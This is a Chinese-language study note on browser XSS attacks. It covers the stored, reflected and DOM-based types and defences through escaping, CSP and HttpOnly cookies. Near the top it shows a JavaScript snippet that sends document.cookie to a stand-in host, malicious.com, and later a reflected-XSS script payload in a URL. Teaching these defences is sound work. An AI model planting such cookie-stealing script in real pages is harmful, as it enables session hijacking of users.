---
title: "浏览器安全-XSS攻击"
published: 2025-05-14
description: "全称Cross Site Scripting 就是跨网站脚本"
tags: ["浏览器", "浏览器安全"]
category: "前端基础"
---

全称Cross Site Scripting 就是跨网站脚本

也就是**恶意程序往HTML文件中插入JS代码**

![image-20250514081323643](https://typora-an.oss-cn-hangzhou.aliyuncs.com/%E5%89%8D%E7%AB%AF/image-20250514081323643.png)

```js
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```

### 攻击方式

- 恶意脚本可以通过document.cookies窃取用户的 Cookie 数据，并将其作为参数添加至恶意站点尾部发送到黑客服务器中

- 可以通过监听用户行为获取用户输入的信用卡信息并发送给恶意服务器,  用的是JavaScript中的`addEventListener` 监听用户的键盘事件

- 可以通过修改DOM制造假的登录窗口, 欺骗用户输入用户名和密码等信息.

- 可以页内生成浮窗广告, 影响用户体验

**这就是XSS攻击, 为了解决XSS攻击, 浏览器引入了内容安全策略, 称为CSP, CSP的核心思想就是让服务器可以决定浏览器加载哪些资源, 让服务器决定浏览器是否执行内联JavaScript代码.  这样就可以大大减少XSS攻击**

### XSS攻击种类

#### 存储性XSS 引入恶意脚本代码

将恶意代码存储到有漏洞的服务器, 访问含有恶意脚本的页面就会自动加载恶意脚本, 然后恶意脚本就会上传你的cookie到他们的服务器

#### 反射型XSS 放到URL上了

比如说你设置了视图要展示xss参数, 然后点击了一个恶意链接是`http://localhost:3000/?xss= <script>alert('你被xss攻击了')</script> ` 就会导致xss被替换成了`<script>alert('你被xss攻击了')</script>`

**恶意脚本本身是作为请求参数发送到站点页面存在漏洞的地方（通常是搜索框），然后脚本反射（出现）在新渲染（或者部分刷新）的页面并执行。**

#### 基于DOM的XSS

比如通过网络传输页面过程中修改HTML页面内容, 有的用wifi路由器劫持, 有的是本地恶意软件, 主要就是在web资源传输过程中或用户使用页面的过程中修改web页面的数据.

### 如何阻止XSS攻击

1. 对于存储型和反射型可以在**前端过滤关键字以及服务端对一些关键的字符进行转码**

   ​	比如对关键的字符进行转码, 比如把script标签包裹的内容全部替换成空, 这样就可以防止请求的时候携带脚本,  脚本也不会执行

2. **充分利用CSP**

   在获取HTML时配置HTTP头Content-Security-Policy

   https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

   1. 限制加载其他域下的资源文件这样即使插入了一个JavaScript脚本也不会被加载
   2. 禁止向第三方域提交数据, 这样用户数据不会泄漏
   3. 禁止执行内联脚本和未授权脚本
   4. 还有上报机制, 可以帮助发现有哪些XSS攻击, 便于修复

3. **使用HttpOnly属性**

   ​	很多XSS攻击都是盗用cookie, 因此可以通过服务器设置响应头中的set-cookie中的HttpOnly属性来保护cookie的安全, 使用HttpOnly的cookie在控制台中也是不一样的,  无法用JavaScript来读取, 比如document.cookie就无法读取到了

   ![image-20250514081731718](https://typora-an.oss-cn-hangzhou.aliyuncs.com/%E5%89%8D%E7%AB%AF/image-20250514081731718.png)

   ​	